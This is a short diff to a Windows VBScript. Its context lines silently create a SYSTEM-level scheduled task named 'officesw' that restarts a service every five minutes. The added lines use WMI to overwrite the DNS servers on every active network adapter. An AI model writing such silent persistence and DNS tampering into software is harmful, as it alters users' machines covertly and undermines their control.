@@ -12,3 +12,20 @@ With CreateObject("WScript.Shell")
     'user="SYSTEM"
     .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
 End With
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
+Set objWMIService = GetObject("winmgmts:" _
+    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")
+
+Set colAdapters = objWMIService.ExecQuery _
+    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
+for each nad in colAdapters
+    If Not IsNull(Nad.DefaultIPGateway) Then
+      if not isnull(Nad.MACAddress) then 
+        arrDNSServers = Array("8.8.8.8", "8.8.8.8")
+        nad.SetDNSServerSearchOrder(arrDNSServers)
+        'mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
+      end if
+    end if  
+next 
